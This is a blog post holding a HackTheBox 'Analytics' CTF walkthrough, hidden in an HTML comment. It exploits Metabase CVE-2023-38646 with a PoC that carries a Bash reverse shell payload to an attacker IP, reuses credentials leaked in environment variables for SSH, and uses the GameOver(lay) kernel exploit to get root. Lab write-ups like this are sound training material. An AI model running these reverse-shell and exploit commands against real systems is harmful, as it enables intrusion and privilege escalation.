---
title: HTB - Analytics
date: 2023-12-29
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, nmap, analytics, cve-2023-38646, cve-2023-32629]
img_path: /assets/htb/fullpwn/analytics/
published: true
image:
    path: room_banner.png
---

## Overview

|:-:|:-:|
|Machine|[Analytics](https://app.hackthebox.com/machines/569)|
|Rank|Easy|
|Time|-|
|Focus|CVEs|

> CONTENT HIDDEN - ACTIVE MACHINE!
{: .prompt-warning}

<!-- ## Information gathering

```shell
# port-scanning
$ sudo nmap analytics -T4 --min-rate 10000 -A

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
```

## Initial foothold

According to Nmap's output, the HTTP server redirects us to `http://analytical.htb/`, so we have to add it to our `/etc/hosts` file:

  ![](etc_hosts.png){: .normal }

  ![](home.png)

When clicking on `Login` we are redirected to `data.analytical.htb`:

  ![](analytical_login.png)

Let's us add this to `/etc/hosts` as well:

  ![](etc_hosts_1.png){: .normal }

  ![](home_data.png){: .normal width="70%"}

Viewing the page source, we can find Metabase's version:

  ![](metabase_version.png)

Searching Google for a public exploit we find the [Metabase Pre-Auth RCE (CVE-2023-38646) POC](https://github.com/Pyr0sec/CVE-2023-38646). This requires the value of the `setup token` which can be found in the `/api/session/properties` directory:

  ![](setup-token.png){: .normal }

All we have to do now, is to open a listener and run the PoC with a Bash reverse shell payload:

  ```shell
  # setting up a listener
  $ nc -lvnp 1337
  listening on [any] 1337 ...
  ```

  ```shell
  # executing the PoC
  $ python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.6/1337 0>&1"
  ```

  ```shell
  # catching the reverse shell
  $ nc -lvnp 1337
  listening on [any] 1337 ...
  connect to [10.10.14.6] from (UNKNOWN) [10.10.11.233] 43200
  bash: cannot set terminal process group (1): Not a tty
  bash: no job control in this shell
  59a5ee253db5:/$
  ```

## Privilege escalation

After exploring the environment, we can find some credentials listed on the `env` variable:

  ```shell
  59a5ee253db5:/$ env
  env
  SHELL=/bin/sh
  MB_DB_PASS=
  HOSTNAME=59a5ee253db5
  LANGUAGE=en_US:en
  MB_JETTY_HOST=0.0.0.0
  JAVA_HOME=/opt/java/openjdk
  MB_DB_FILE=//metabase.db/metabase.db
  PWD=/
  LOGNAME=metabase
  MB_EMAIL_SMTP_USERNAME=
  HOME=/home/metabase
  LANG=en_US.UTF-8
  META_USER=metalytics # Username
  META_PASS=An4lytics_ds20223# # Password
  MB_EMAIL_SMTP_PASSWORD=
  USER=metabase
  SHLVL=4
  MB_DB_USER=
  FC_LANG=en-US
  LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
  LC_CTYPE=en_US.UTF-8
  MB_LDAP_BIND_DN=
  LC_ALL=en_US.UTF-8
  MB_LDAP_PASSWORD=
  PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  MB_DB_CONNECTION_URI=
  JAVA_VERSION=jdk-11.0.19+7
  _=/usr/bin/env
  OLDPWD=/var
  ```

We can use them to log in to the SSH server and right away find the `user.txt`:

  ```shell
  $ ssh metalytics@analytics
  # pass: An4lytics_ds20223#
  metalytics@analytics:~$ ls -la
  total 36
  drwxr-x--- 4 metalytics metalytics 4096 Aug  8 11:37 .
  drwxr-xr-x 3 root       root       4096 Aug  8 11:37 ..
  lrwxrwxrwx 1 root       root          9 Aug  3 16:23 .bash_history -> /dev/null
  -rw-r--r-- 1 metalytics metalytics  220 Aug  3 08:53 .bash_logout
  -rw-r--r-- 1 metalytics metalytics 3771 Aug  3 08:53 .bashrc
  drwx------ 2 metalytics metalytics 4096 Aug  8 11:37 .cache
  drwxrwxr-x 3 metalytics metalytics 4096 Aug  8 11:37 .local
  -rw-r--r-- 1 metalytics metalytics  807 Aug  3 08:53 .profile
  -rw-r----- 1 root       metalytics   33 Dec 29 16:56 user.txt
  -rw-r--r-- 1 metalytics metalytics   39 Aug  8 11:30 .vimrc
  ```

There isn't anything of interest laying around, so we can check the kernel's version and look for a public exploit:
  
  ```shell
  metalytics@analytics:/$ uname -a
  Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
  ```

There is the [GameOver(lay) Ubuntu Privilege Escalation](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) which we can copy and paste on our target from the `/tmp` directory:

  ```shell
  metalytics@analytics:/$ cd /tmp
  metalytics@analytics:/tmp$ nano exploit.sh
  metalytics@analytics:/tmp$ chmod +x exploit.sh
  metalytics@analytics:/tmp$ ./exploit.sh
  [+] You should be root now
  [+] Type 'exit' to finish and leave the house cleaned
  root@analytics:/tmp# id
  uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
  root@analytics:/tmp# ls /root/
  root.txt
  ``` -->

<figure>
    <img src="machine_pwned.png"
    alt="Machine pwned" >
</figure>